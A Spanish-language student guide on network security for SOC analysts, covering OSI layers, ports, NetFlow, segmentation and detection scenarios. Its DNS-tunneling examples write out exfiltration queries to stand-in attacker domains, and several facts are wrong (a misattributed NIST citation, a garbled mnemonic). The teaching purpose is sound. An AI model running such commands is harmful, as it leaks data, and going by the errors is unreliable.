# 🔐 NETWORKING - BLUE TEAM STUDENT GUIDE

## 📖 ¿Qué Es Esto?

**Networking en Ciberseguridad** es la disciplina de entender cómo los activos, dispositivos y servidores están conectados entre sí, cómo se comunican a través de protocolos específicos, y cómo **detectar, prevenir y responder a comportamientos anómalos** en la infraestructura de red.

En **30 segundos:** La red es el corazón de cualquier infraestructura. Un blue teamer debe entender cómo funciona normalmente para detectar cuándo algo está mal.

---

## 🎯 ¿Por Qué un Profesional de SOC/Blue Team Necesita Esto?

### **Escenarios Reales de Trabajo:**

1. **Detección de Intrusiones**
   - "¿Por qué este usuario accede desde Japón a las 3am si normalmente se conecta desde México?"
   - → Necesitas entender **geolocalización y logs de acceso**

2. **Investigación de Incidentes**
   - "¿Qué datos se exfiltraron? ¿Hacia dónde?"
   - → Necesitas leer **NetFlow, DNS logs, firewall logs**

3. **Prevención de Ataques**
   - "¿Cómo evito que alguien descargue la base de datos completa?"
   - → Necesitas **segmentación, firewall rules, detección de tráfico anómalo**

4. **Escalada de Incidentes**
   - "¿Es esto una amenaza real o comportamiento normal?"
   - → Necesitas **establecer baselines y entender protocolos**

### **Preguntas de Entrevista Que Te Harán:**

- "Describe cómo investigarías un caso de data exfiltration"
- "¿Qué diferencia hay entre un ataque DDoS en capa 3 vs capa 4?"
- "¿Cómo detectarías DNS tunneling en tu SIEM?"
- "Explica qué es segmentación de red y por qué es importante"
- "Un usuario intenta acceder a recursos de Admin desde su cuenta normal. ¿Qué haces?"

---

## 🔍 El Concepto Desglosado

### **Parte 1: Fundamentos - La Infraestructura**

#### **¿Qué hace que exista una red?**

Una red requiere:

| Componente | Función | Relevancia en SOC |
|-----------|---------|------------------|
| **Dispositivos** | Laptops, servidores, switches, routers | Cada uno genera logs |
| **Conexión** | Cables, Wi-Fi, internet | Puntos de ataque |
| **Protocolos** | Reglas de comunicación (TCP/IP) | Patrones de ataque |
| **Acceso** | Quién se conecta | Control + Detección |

#### **La Realidad en Infraestructura:**

Todos estos activos deben:
- ✅ **Estar conectados** → Disponibilidad
- ✅ **Comunicarse seguro** → Integridad
- ✅ **Ser monitoreados** → Seguridad
- ✅ **Coexistir sin conflictos** → Múltiples usuarios

---

### **Parte 2: Protocolos - El Idioma de la Red**

#### **¿Qué son los Protocolos?**

Reglas que definen CÓMO se comunican los dispositivos. Son como "idiomas" de la red.

#### **Protocolos Clave para Blue Team:**

**CAPA 3 - NETWORK (IP):**
- **IP (IPv4/IPv6)** → Dirección del dispositivo (192.168.1.10)
- **ICMP** → Ping, traceroute (puede ser DDoS)

**CAPA 4 - TRANSPORT:**
- **TCP** → Conexión confiable (web, email, SSH)
- **UDP** → Conexión rápida pero sin garantía (DNS, streaming)

**CAPA 7 - APPLICATION:**
- **DNS** → Resolver nombres (google.com → 142.250.185.46)
- **HTTP/HTTPS** → Tráfico web
- **SSH** → Conexión segura a servidores
- **SMB** → Compartir archivos Windows
- **LDAP** → Directorio de usuarios (Active Directory)
- **RDP** → Escritorio remoto

#### **¿Por Qué Importa?**

Cada protocolo tiene:
- **Vulnerabilidades específicas** → Saber cómo se ataca
- **Logs únicos** → Saber dónde buscar evidencia
- **Comportamiento normal** → Saber cuándo algo está mal

**Ejemplo:**
```
Puerto 22 (SSH) en servidor web = ANÓMALO
Puerto 443 (HTTPS) en servidor web = NORMAL

¿Por qué?
- SSH es para administración, no para usuarios
- Si lo ves, alguien podría estar administrando el servidor maliciosamente
```

---

### **Parte 3: Modelo OSI - Las 7 Capas de la Red**

**¿Por qué es importante?** Porque CADA CAPA tiene ataques y defensas diferentes.

#### **Mnemónico para Recordar:**

🇪🇸 **"Por Dios No Tires Salsa Pepperoni Arriba"**

| # | Capa | Mnemónico | Función | Ataques Comunes | Logs/Detección |
|---|------|-----------|---------|-----------------|-----------------|
| **7** | Application | **A**rriba | HTTP, DNS, SSH, FTP | SQL injection, Phishing, Buffer overflow | WAF logs, Application logs |
| **6** | Presentation | **P**epperoni | Encriptación, compresión | SSL stripping, Decryption bypass | SSL/TLS handshake logs |
| **5** | Session | **S**alsa | Manejo de sesiones | Session hijacking, Token theft | Session logs, Cookie manipulation |
| **4** | Transport | **T**ires | TCP, UDP, puertos | SYN flood, Port scanning, UDP flood | Netstat, conexiones fallidas |
| **3** | Network | **N**o | IP, routers | DDoS, IP spoofing, ICMP flood | NetFlow, IDS alerts, IPs sospechosas |
| **2** | Data Link | **D**ios | Switches, MAC, ARP | ARP spoofing, MAC flooding | DHCP logs, ARP tables |
| **1** | Physical | **P**or | Cables, conectores | Cortar cables, jamming | Alertas de puerto down |

#### **Ejemplo Real - Ataque Multicapa:**

```
Usuario recibe email phishing (Capa 7 - Application)
  ↓
Hace clic, descarga malware
  ↓
Malware se conecta a servidor C2 en Rusia (Capa 4 - Transport, TCP puerto 443)
  ↓
Realiza ARP spoofing para interceptar tráfico (Capa 2 - Data Link)
  ↓
Exfiltra datos de base de datos (Capa 3 - Network, usando IPs falsas)

¿Dónde lo detectamos?
- Capa 7: WAF detecta phishing
- Capa 4: Firewall ve conexión a IP rusa
- Capa 2: ARP monitor ve cambios anómalos
- Capa 3: NetFlow ve tráfico hacia afuera
```

---

### **Parte 4: Comportamiento Anómalo - Qué Buscar**

#### **¿Qué es Comportamiento Anómalo?**

Cualquier cosa que se desvíe de lo "normal" y podría indicar:
- 🚨 Compromiso de cuenta
- 🚨 Malware en ejecución
- 🚨 Exfiltración de datos
- 🚨 Ataque interno

#### **Ejemplos Reales que Deberías Detectar:**

**1. Geolocalización Imposible**
```
Usuario conectado desde México a las 9:00 AM
5 minutos después conectado desde Japón

→ IMPOSIBLE viajar en 5 minutos
→ Cuenta comprometida o VPN sospechosa
→ ALERTA: Investigar login
```

**2. Ejecución de Comandos Fuera de Horario**
```
PowerShell ejecutando comandos a las 3:00 AM
Usuario normalmente trabaja 9-17:00

→ ¿Quién está usando su cuenta?
→ ¿Qué comandos ejecuta?
→ ALERTA: Revisar logs de PowerShell (Event ID 4688)
```

**3. Transferencia de Datos Anómala**
```
Usuario descarga 50GB a las 1:00 AM
Normalmente descarga 100MB diarios

→ ¿Qué datos se llevan?
→ ¿Hacia dónde van?
→ ¿Quién autorizó esto?
→ ALERTA: Bloquear si es posible, investigar
```

**4. Acceso a Recursos No Autorizados**
```
Usuario de Marketing intenta acceder a VLAN de Contabilidad
Firewall lo bloquea

→ ¿Por qué lo intenta?
→ ¿Es compromiso o error del usuario?
→ ALERTA: Contactar usuario, revisar movimientos recientes
```

**5. Actividad en Puertos Inusuales**
```
Servidor web comunica en puerto 3389 (RDP)
Solo debería comunicar en 80 y 443

→ Posible movimiento lateral del atacante
→ ALERTA: Aislar servidor, investigar conexiones
```

---

## ⚙️ Qué DEBES Memorizar

### **Puertos Comunes y Qué Significa Verlos:**

| Puerto | Protocolo | Normal En | Anómalo En | Acción |
|--------|-----------|-----------|-----------|--------|
| **22** | SSH | Servidores Linux | Laptop usuario | Investigar |
| **80** | HTTP | Servidor web | Servidor interno | Revisar |
| **443** | HTTPS | Cualquier servidor web | Detectar HTTPS en puerto raro | Revisar certificados |
| **3306** | MySQL | Base de datos | Laptop usuario | CRÍTICO - Aislar |
| **3389** | RDP | Admin, servidor | Usuario normal | CRÍTICO - Aislar |
| **5432** | PostgreSQL | Base de datos | Acceso no autorizado | CRÍTICO - Aislar |
| **445** | SMB | File server, dominio | Servidor web, internet | Investigar movimiento lateral |
| **53** | DNS | Resolver nombres | Puerto no estándar para DNS | Buscar DNS tunneling |

### **Las 3 Preguntas que Siempre Hacer:**

1. **¿Es este tráfico AUTORIZADO?**
   - ¿El usuario debería tener acceso?
   - ¿El dispositivo debería estar conectado?

2. **¿Es este tráfico ESPERADO?**
   - ¿A qué hora normalmente ocurre?
   - ¿Cuántos datos son?
   - ¿Hacia dónde se conecta?

3. **¿Es este tráfico URGENTE?**
   - ¿Hay indicadores de compromiso?
   - ¿Hay exfiltración de datos?
   - ¿Necesita escalación inmediata?

### **Mnemónico para Responder:**

**"AAU"** = Autorizado, Autorizado, Urgente
- Si cualquiera es NO → Escala

---

## 📚 Qué DEBES Entender Profundamente

### **1. La Diferencia Entre Estos Tres:**

#### **DNS (No es transporte de datos)**

**Lo que NO es:**
- DNS **NO transporta datos** del usuario
- DNS es solo un **traductores de nombres**

**Lo que SÍ es:**
- google.com (nombre) → 142.250.185.46 (dirección IP)
- Usa puerto 53 UDP/TCP
- Lo usa TODO en la red (navegadores, aplicaciones, malware)

**Por qué es crítico en SOC:**

```
Caso 1: DNS Tunneling (exfiltración)
Atacante: nslookup datos-secretos.attacker.com
DNS query que contiene datos encriptados
→ Se ve como DNS normal pero lleva datos

Caso 2: DNS Beaconing (malware comunicándose)
Malware: Cada minuto consulta x9ak3.malware-c2.ru
→ Es el corazón del malware (así se comunica)

Caso 3: DNS Hijacking (interceptación)
Atacante: Redirige google.com → fake-google.com
→ El usuario cree que entra a Google pero es fake

DETECCIÓN:
- Buscar DNS queries a dominios maliciosos (lista negra)
- Buscar patrones: Same domain, cada X segundos
- Buscar DNS responses inusualmente grandes
```

#### **Segmentación (NO es solo "aislar")**

**Lo que dijiste:** "Aislamiento de servidores"  
**Lo que realmente es:** División de red con **reglas de comunicación entre segmentos**

**Ejemplo real:**

```
RED SIN SEGMENTACIÓN:
┌──────────────────────────────────────┐
│  Todo está en la misma red (172.16.0.0/16)
│  Usuario, servidor web, BD, admin todos juntos
│  Si hacker entra por servidor web → accede a TODO
└──────────────────────────────────────┘

RED CON SEGMENTACIÓN:
┌─────────────────┐
│ DMZ (172.16.1.0)│ ← Servidores web (acceso internet)
├─────────────────┤ FIREWALL: DMZ ↔ Usuarios (solo puerto 443)
│ Usuarios        │
│ (172.16.2.0)    │ FIREWALL: Usuarios ↔ Servidores (solo puertos específicos)
├─────────────────┤
│ Servidores BD   │
│ (172.16.3.0)    │ FIREWALL: Servidores ↔ Admin (muy restrictivo)
├─────────────────┤
│ Admin/IT        │
│ (172.16.4.0)    │
└─────────────────┘

VENTAJA EN SOC:
- Usuario intenta conectarse a puerto 22 en BD → BLOQUEADO + ALERTA
- Hacker en DMZ no puede hablar con BD → Contenido
- Cada movimiento lateral genera log → Investigación clara
```

#### **Reglas de Acceso vs Reglas de Detección:**

| Tipo | Función | Quién | Dónde |
|------|---------|-------|-------|
| **Operación** | Definen comportamiento ESPERADO | IT/Redes | Documentación, políticas |
| **Seguridad** | Implementan restricciones TÉCNICAS | Firewall, NAC, IAM | Dispositivos |
| **Detección** | Alertan de comportamiento ANÓMALO | SOC, SIEM | Logs, sensores |

**Ejemplo real:**

```
REGLA DE OPERACIÓN:
"Usuarios pueden navegar en internet durante horario laboral"

REGLA DE SEGURIDAD:
"Firewall solo permite HTTP/HTTPS en puerto 80/443, bloquea todo lo demás"

REGLA DE DETECCIÓN:
"Si usuario descarga >100MB entre 22:00-06:00, escalar como P2"

Escenario:
Usuario intenta descargar 500MB a las 3:00 AM
  → REGLA DE SEGURIDAD: Firewall lo ve
  → REGLA DE DETECCIÓN: SIEM lo alerta
  → TÚ INVESTIGAS: ¿Qué descarga? ¿Autorizado? ¿Malware?
```

### **2. El Concepto de "Baseline"**

**¿Qué es?** El comportamiento NORMAL de tu red.

```
Sin Baseline (primeros días):
Cualquier cosa podría ser ataque → Falsos positivos enormes

Con Baseline establecido:
Usuario "X" siempre descarga ~100MB diarios en horario 9-17
Hoy descargó 500MB a las 3am
→ Esto SÍ es anómalo → Investigar

Baseline debe incluir:
- ¿Quién accede a dónde normalmente?
- ¿Cuántos datos típicamente se transfieren?
- ¿A qué horas?
- ¿Desde dónde geográficamente?
```

### **3. Network Flow (NetFlow)**

**¿Qué es?** Los "restos" que dejan los datos en la red.

```
Cuando usuario descarga archivo:
- El archivo en sí NO se captura
- Pero se captura: 
  - IP origen (192.168.1.10)
  - IP destino (142.250.185.46)
  - Puerto origen (52341)
  - Puerto destino (443)
  - Bytes enviados: 0
  - Bytes recibidos: 500,000,000
  - Duración: 5 minutos

Con esto el blue teamer sabe:
"Usuario descargó 500MB desde google.com en 5 minutos"
Sin ver el archivo completo.
```

---

## 🚨 Ataques y Defensas Específicas

### **Ataque 1: Data Exfiltration (Robo de Datos)**

#### **¿Cómo funciona?**

```
Atacante ya tiene acceso a la red (insider, compromiso previo)
  ↓
Busca datos valiosos (base de datos, documentos)
  ↓
Copia datos a disco externo o nube
  ↓
Envía datos hacia afuera de la red
```

#### **¿Dónde lo ves?**

| Log | Qué Buscar | Ejemplo |
|-----|-----------|---------|
| NetFlow | Conexión saliente inusual a IP externa, alto volumen | IP origen: laptop interna → IP destino: AWS (>10GB) |
| Firewall | Intento de conexión saliente bloqueada o permitida anómala | Usuario 192.168.1.50 intenta a 45.33.32.1 puerto 443 |
| DNS | Consultas a dominios cloud sospechosos | nslookup dropbox.com, mega.nz, pastebin.com |
| Proxy | Descarga a sitios compartición archivos | User "jsmith" descargó 5GB a mega.nz |
| Endpoint | Acceso a archivos sensibles | "contract_2024.xlsx" accedido por user "bperez" a las 3am |

#### **¿Cómo lo previene?**

✅ **Segmentación:** BD en VLAN separada, usuarios no pueden acceder directamente  
✅ **Firewall:** Bloquear puertos no autorizados salientes  
✅ **DLP (Data Loss Prevention):** Herramienta que detecta patrones de exfiltración  
✅ **Endpoint Detection:** Monitorear copias masivas de archivos  
✅ **Logging:** Auditoría de acceso a archivos sensibles  

---

### **Ataque 2: Lateral Movement (Movimiento Lateral)**

#### **¿Cómo funciona?**

```
Atacante tiene acceso a laptop de usuario normal
  ↓
Laptop tiene acceso a File Server compartido
  ↓
Atacante usa credenciales cached para saltar a File Server
  ↓
Desde File Server puede llegar a Servidor de Base de Datos
  ↓
Finalmente accede a datos críticos
```

#### **¿Dónde lo ves?**

| Log | Señal Anómala |
|-----|----------------|
| **Firewall** | Laptop intenta hablar con puerto 445 (SMB) en BD |
| **Firewall** | Usuario desde laptop intenta puerto 3306 (MySQL) |
| **Segmentación** | Violación de regla: Usuarios-VLAN → Servidores-VLAN |
| **Active Directory** | Login fallidos múltiples en cuenta de servicio |
| **Antivirus** | Herramientas de hacking detectadas (mimikatz, psexec) |

#### **¿Cómo lo previene?**

✅ **Segmentación:** Usuarios ↔ Servidores bloqueados por firewall  
✅ **Endpoint Detection:** Detectar herramientas de hacking  
✅ **Credential Guard:** No cachear credenciales de alto nivel  
✅ **MFA (Multi-Factor Auth):** Dificultar robo de credenciales  
✅ **Monitoreo de Movimiento:** Alertar cuando cuenta salta entre subredes  

---

### **Ataque 3: DDoS (Denegación de Servicio)**

#### **¿Cómo funciona?**

```
Atacante envía miles de conexiones falsas
  ↓
Servidor legítimo agotado respondiendo
  ↓
Usuarios reales no pueden conectarse
```

#### **¿Dónde lo ves?**

| Capa | Log | Señal |
|------|-----|--------|
| **Capa 3 (Network)** | NetFlow | 1,000 IPs diferentes → tu IP servidor web en puerto 80 |
| **Capa 4 (Transport)** | IDS/IPS | SYN flood, UDP flood |
| **Capa 7 (Application)** | WAF | Requests HTTP idénticas desde múltiples IPs |

#### **¿Cómo lo previene?**

✅ **Rate Limiting:** Máximo X conexiones por segundo  
✅ **Geo-blocking:** Bloquear IPs de países no esperados  
✅ **DDoS Mitigation:** Servicios como Cloudflare, Akamai  
✅ **IDS/IPS:** Detectar y bloquear patrones de DDoS  

---

### **Ataque 4: DNS Tunneling (Comunicación Encubierta)**

#### **¿Cómo funciona?**

```
Malware infecta laptop
  ↓
Malware no puede conectarse directamente (firewall bloquea)
  ↓
Usa DNS para "tunelizar" datos (encriptados en queries DNS)
  ↓
Comunica con servidor C2 cada minuto
```

#### **¿Dónde lo ves?**

```
NORMAL:
nslookup google.com
→ 1 query, respuesta IP normal

SOSPECHOSO (DNS Tunneling):
nslookup a9k3jfh2k1jh2k1jh21kj3h2kj1h2k1h2k1h.malware-c2.ru
→ Query muy largo
→ Se repite cada minuto exacto
→ Respuesta anómala o no hay respuesta
```

#### **¿Cómo lo previene?**

✅ **DNS Filtering:** Bloquear dominios maliciosos conocidos  
✅ **DNS Monitoring:** Detectar patrones (DNS beaconing cada X segundos)  
✅ **Validación de Respuestas:** Respuesta DNS no coincide con query  
✅ **Limit DNS Queries:** Máximo X queries por minuto por cliente  

---

## ❌ Errores Comunes que Estudiantes Cometen

### **Error 1: "DNS Transporta Datos"**

❌ **Incorrecto:** "DNS mueve los datos de un lado a otro"

✅ **Correcto:** "DNS resuelve nombres a direcciones IP. El transporte lo hace TCP/UDP"

**Por qué importa:**
- En entrevista si dices esto, te corrigen inmediatamente
- En SOC, si no entiendes qué es DNS, no detectas DNS tunneling
- Es como confundir el directorio telefónico (DNS) con la compañía de telefonía (TCP)

---

### **Error 2: "Segmentación es solo aislar servidores"**

❌ **Incorrecto:** "Separamos el servidor de BD, ya está segmentado"

✅ **Correcto:** "Segmentación es crear VLANs con reglas de firewall entre ellas que dicen QUÉ puede hablar con QUÉ"

**Consecuencia del error:**
- Pones BD en VLAN separada
- Pero firewall permite TODO → Malware sigue moviéndose lateralmente
- Crees que estás seguro pero no

---

### **Error 3: "Si el firewall lo bloquea, es anómalo"**

❌ **Incorrecto:** "Firewall bloqueó intento de conexión, fue un ataque"

✅ **Correcto:** "Firewall bloqueó algo, podría ser:
- Usuario intentando acceder a recurso sin permiso (normal)
- Ataque (necesita investigación)
- Malware (necesita escalación)"

**Consecuencia:**
- Escala TODO como crítico → Falsos positivos enormes
- El SOC se satura → Pierdes credibilidad

---

### **Error 4: Confundir Logs**

❌ **Incorrecto:** "Busco en logs de DNS si hay exfiltración de datos"

✅ **Correcto:** "Exfiltración la veo en:
1. NetFlow (volumen anómalo)
2. Firewall (conexión saliente)
3. Proxy (descarga a cloud)
4. Endpoint (acceso a archivos sensibles)"

**Consecuencia:**
- Pierdes tiempo en logs incorrectos
- En entrevista, error técnico grave

---

### **Error 5: No Entender Baselines**

❌ **Incorrecto:** "Usuario descargó 100MB, eso es anómalo"

✅ **Correcto:** "Necesito saber:
- ¿Cuánto descarga normalmente?
- ¿A qué hora?
- ¿Desde dónde?
- ¿A dónde?
- ¿Es su trabajo descargar datos?"

**Consecuencia:**
- Alertas falsas constantemente
- Te da mal nombre en el SOC

---

## 🧪 Escenarios Prácticos para Analizar

### **Escenario 1: El Acceso Imposible**

```
Evento:
- 9:00 AM: Usuario "jgarcia" logea desde México (192.168.1.50)
- 9:05 AM: Usuario "jgarcia" logea desde Japón (202.214.X.X)

Análisis:
1. ¿Qué logs miro?
   - Login events (Event ID 4624 en Windows)
   - Geolocalización de IP
   - VPN logs (¿usó VPN?)

2. ¿Qué preguntas hago?
   - ¿Viajó jgarcia a Japón?
   - ¿Tiene VPN conectada?
   - ¿Comparte contraseña?

3. ¿Qué acción tomo?
   - ¿Baja: Contactar usuario, verificar
   - ¿Media: Resetear contraseña, revisar movimientos recientes
   - ¿Alta: Si hay más cambios, aislar cuenta

CONCLUSIÓN: Es un Compromiso Probable. Requiere investigación.
```

### **Escenario 2: El Descargón a las 3am**

```
Evento:
NetFlow muestra:
- IP origen: 192.168.1.75 (laptop employee)
- IP destino: 54.239.28.30 (AWS)
- Bytes enviados: 100MB
- Bytes recibidos: 0
- Hora: 03:15 AM

Análisis:
1. ¿Qué significa?
   - Usuario laptop descargó 100MB HACIA AWS
   - No fue descarga, fue SUBIDA
   - A las 3am (fuera de horario)

2. ¿Qué logs complementarios busco?
   - Firewall: ¿Permitió la conexión?
   - DNS: ¿Resolvió qué dominio en AWS?
   - Endpoint: ¿Qué archivo se copió?
   - Proxy: ¿Hay registro del upload?

3. ¿Qué acción?
   - CRÍTICO: Posible data exfiltration
   - Aislar laptop, congelar cuenta
   - Revisar archivos accedidos en últimas 24h

CONCLUSIÓN: Alta probabilidad de compromiso. Requiere escalación inmediata.
```

### **Escenario 3: El Movimiento Lateral**

```
Evento:
Firewall log:
- Fuente: 192.168.2.105 (laptop usuario)
- Destino: 192.168.3.50 (SQL Server)
- Puerto: 3306 (MySQL)
- Estado: BLOQUEADO

Análisis:
1. ¿Qué pasó?
   - Laptop intentó conectar a BD
   - Firewall lo bloqueó (buena segmentación)
   - Pero alguien lo intentó

2. ¿Quién es 192.168.2.105?
   - ¿Es laptop de trabajo o personal?
   - ¿Quién la usa?
   - ¿Tiene malware?

3. ¿Acción?
   - Media: Contactar usuario "¿Intentaste conectarte a BD?"
   - Si dice NO: Malware confirmado
   - Aislar laptop, scan antivirus, investigar compromiso

CONCLUSIÓN: Posible movimiento lateral bloqueado. Requiere investigación.
```

### **Preguntas Para Responder (Tú contesta):**

**Escenario 1:** ¿Qué harías si el usuario confirma que viajó a Japón?

**Escenario 2:** ¿Cómo sabrías qué archivo se subió si solo ves NetFlow?

**Escenario 3:** ¿Por qué es importante que el firewall BLOQUEÓ el intento?

---

## ❓ Preguntas de Entrevista Que Podrías Recibir

### **Nivel 1 (Junior/Inicial):**

1. "¿Cuáles son las 7 capas del modelo OSI y da un ejemplo de ataque en cada una?"
   
2. "¿Qué diferencia hay entre TCP y UDP? ¿Cuándo usarías uno u otro?"

3. "¿Qué es segmentación de red y por qué es importante?"

4. "¿Cómo investigarías un caso donde un usuario descarga 50GB a las 3am?"

5. "¿Qué es DNS y cómo detectarías DNS tunneling?"

**Respuestas Esperadas:**

1. (Usa mnemónico "Por Dios No Tires Salsa Pepperoni Arriba" + 1 ataque por capa)
2. TCP=confiable, UDP=rápido. TCP para data crítica, UDP para streaming
3. Dividir red en subredes con reglas firewall entre ellas
4. (Revisa NetFlow, Firewall, Proxy, Endpoint logs. Valida con usuario)
5. (DNS resuelve nombres. Tunneling = datos encriptados en queries DNS)

---

### **Nivel 2 (Intermedio/Mid-Level):**

1. "Describe cómo investigarías un caso de data exfiltration end-to-end"

2. "¿Cómo detectarías un ataque de movimiento lateral en tu red?"

3. "Explica qué es NetFlow y cómo lo usarías en una investigación"

4. "¿Cuál es la diferencia entre una regla de firewall de operación vs una de detección?"

5. "Un usuario normalmente descarga 100MB diarios. Hoy descargó 500MB. ¿Investigas? ¿Por qué?"

**Respuestas Esperadas:**

1. (NetFlow → Firewall → Proxy → Endpoint → Active Directory para contexto)
2. (Monitorear intentos en puertos altos, violaciones de firewall entre VLANs, tools sospechosas)
3. (Metadata de conexiones: IP origen/destino, puertos, volumen. Útil para patrones)
4. (Operación = qué está permitido. Detección = qué alertar cuando sucede)
5. (Depende del baseline. Pero sí, porque se desvía de lo normal)

---

### **Nivel 3 (Senior/Experto):**

1. "Diseña una arquitectura de red segmentada para una empresa de 500 empleados. Justifica cada segmento."

2. "Un atacante compromete un laptop. ¿Cómo intentaría moverse lateralmente? ¿Cómo lo detendrías?"

3. "¿Cómo diferenciasía entre un usuario legítimo trabajando remoto y un atacante usando credenciales robadas?"

4. "Propón una estrategia de detección de data exfiltration usando solo logs de firewall y NetFlow"

5. "¿Cómo implementarías una baseline de tráfico de red sin generar falsos positivos?"

**Respuestas Esperadas:**

1. (DMZ, Usuarios, Servidores, Admin. Con firewall granular entre cada uno. Explicar reasoning)
2. (Movimiento lateral: SMB, RDP, LDAP. Detención: Segmentación, MFA, EDR, NetFlow monitoring)
3. (Geolocalización, horarios, volumen, protocolos. Baseline + anomalías = score de riesgo)
4. (Volumen saliente anómalo + conexiones a IPs nunca vistas + duración larga + puertos altos)
5. (Recopilar datos normales 1-2 meses, usar machine learning, ajustar umbrales, validar)

---

## 🔗 Cómo Esto Se Conecta Con Todo Lo Demás

### **Conexiones en tu Roadmap Blue Team:**

| Tema | Conexión con Networking |
|------|------------------------|
| **Active Directory (AD)** | El "corazón" de autenticación. Los logs de AD muestran QUIÉN se conectó y DÓNDE |
| **SIEM (Splunk, ELK)** | Recolecta TODOS los logs de red (firewall, DNS, NetFlow). Sin SIEM no ves patrones |
| **Endpoint Detection (EDR)** | Ve lo que pasa EN la máquina. Networking ve lo que pasa ENTRE máquinas |
| **Windows Event Logs** | Event ID 4688 = comando ejecutado. 4624 = login. Combina con firewall logs |
| **Incident Response** | Cuando investigas incidente de red, necesitas saber Networking para rastrear al atacante |
| **Threat Hunting** | Buscas patrones en NetFlow, DNS, firewall. Networking es la base |
| **Cloud Security** | AWS/Azure tienen logging de red igual a on-prem. Mismo concepto |
| **Firewalls (PAN-OS, Cisco)** | Las "puertas" de tu red. Necesitas entender reglas y logs |

**Ejemplo Conexión Real:**

```
Incidente: Posible ransomware
  ↓
EDR detecta: Proceso sospechoso en laptop
  ↓
Active Directory: Usuario "jsmith" login confirmado
  ↓
Firewall: Laptop intenta conectar a 45.33.32.1 puerto 443
  ↓
NetFlow: 500MB hacia esa IP en 5 minutos
  ↓
DNS: Query anterior a malware-c2.ru
  ↓
Conclusión: Ransomware comunicando con C2, exfiltrando datos
  ↓
Acción: Aislar laptop, bloquear IP en firewall, resetear credenciales
```

Sin Networking, no ves esto completo.

---

## 💾 TL;DR para Personas Ocupadas

### **Tabla Rápida de Referencia:**

| Necesito... | Busco... | Log | Qué significa |
|------------|----------|-----|----------------|
| **Detectar exfiltración** | Alto volumen saliente | NetFlow | Alguien lleva datos afuera |
| **Detectar movimiento lateral** | Conexión a puerto SMB (445) | Firewall | Intento de acceso a compartir |
| **Detectar malware comunicando** | Queries DNS frecuentes | DNS log | Malware "phoneando" a C2 |
| **Detectar acceso no autorizado** | Login desde IP nueva | AD login | Posible compromiso de cuenta |
| **Detectar DDoS** | Muchas conexiones de IPs distintas | IDS/IPS | Ataque de volumen |
| **Detectar lateral movement bloqueado** | Firewall DENY de puerto alto | Firewall | Buena segmentación, investigar intento |

### **Los 3 Logs Principales en Networking:**

1. **Firewall Logs** → Qué conexiones se permiten/bloquean
2. **NetFlow** → Volumen y dirección de tráfico
3. **DNS Logs** → Qué dominios se resuelven

Si entiendes estos 3, entiendes el 80% de la seguridad de red.

### **Las 3 Reglas de Oro:**

✅ **No confíes en lo que no entiendas**  
✅ **Siempre valida con el usuario**  
✅ **Si no sabes, ESCALA**

---

## 📌 Realidad en Producción

### **Qué Sucede Realmente en un SOC:**

**Día 1:**
```
SIEM alerta: "User jgarcia login from Japan"
Tú: "¿Qué hago?"
Respuesta: Mira firewall, DNS, AD logs. Contextualiza.
```

**Día 2:**
```
Ticket: "Network unusually slow"
Tú: Revisar NetFlow → encontras DDoS
Acción: Escalar a networking, activar mitigation
```

**Día 3:**
```
EDR alerta: "Suspicious process"
Tú: Revisar firewall logs de esa máquina
Pregunta: ¿Hacia dónde se conectaba?
```

**La Realidad:**
- 80% de alertas son falsas positivas
- 15% son comportamiento raro pero legítimo
- 5% son compromisos reales
- Tu trabajo es encontrar ese 5%

**Herramientas que REALMENTE usarás:**

✅ Splunk (SIEM) - Búsquedas de logs  
✅ ELK Stack (Elasticsearch) - Análisis de datos  
✅ Wireshark - Análisis de tráfico (investigaciones profundas)  
✅ Zeek (formerly Bro) - Monitoreo de red  
✅ Suricata/Snort - IDS/IPS  
✅ Firewall CLI - Ver logs directamente  
✅ NetFlow Analyzer - Visualizar tráfico  

---

## 📚 Lectura Adicional

### **Documentos Oficiales:**

- NIST SP 800-153: Guidelines on Network Security Testing
- OWASP Top 10: Web Security
- CIS Controls: Basic/Foundational Network Segmentation

### **Libros Recomendados:**

- "The Cyber Threat Playbook" - Michael Roytman
- "Network Security Through Data Analysis" - Applegate
- "Practical Packet Analysis" - Chris Sanders

### **Cursos:**

- TryHackMe: Network Fundamentals
- HackTheBox: Network Labs
- Coursera: Network Security Basics

### **Certificaciones Relacionadas:**

- CompTIA Network+
- CompTIA Security+
- GCIA (GIAC Certified Intrusion Analyst)
- CEH (Certified Ethical Hacker)

---

## 🎯 Siguientes Pasos

### **Para Solidificar tu Conocimiento:**

1. **Instala Wireshark** en tu lab
2. **Captura tráfico** de acciones normales (login, descarga, etc)
3. **Analiza patrones** (qué protocolos ves, qué puertos se usan)
4. **Rompe tráfico** (intenta diferentes ataques en lab, ve cómo se ve en logs)
5. **Practica en TryHackMe** Network Fundamentals
6. **Haz escenarios SOC** con datos reales (si tienes acceso)

### **Preguntas para Auto-Evaluarte:**

- [ ] Entiendo qué es DNS y cómo diferenciarlo de TCP/UDP
- [ ] Puedo explicar las 7 capas del OSI sin mirar notas
- [ ] Sé qué logs buscar para cada tipo de ataque
- [ ] Puedo diseñar una red segmentada simple
- [ ] Entiendo NetFlow y qué significa alto volumen saliente
- [ ] Conozco 5 puertos comunes y qué significa verlos en lugares anómalos

Si respondiste SÍ a todo → Estás listo para entrevistas básicas.

---

**Documento Generado:** 25/07/2026  
**Nivel:** Junior to Intermediate Blue Teamer  
**Próximo Tema:** Active Directory Security | Incident Response Fundamentals | SIEM Basics

---

*¿Preguntas sobre este documento? Crea un issue en tu repositorio o contacta a tu instructor.*
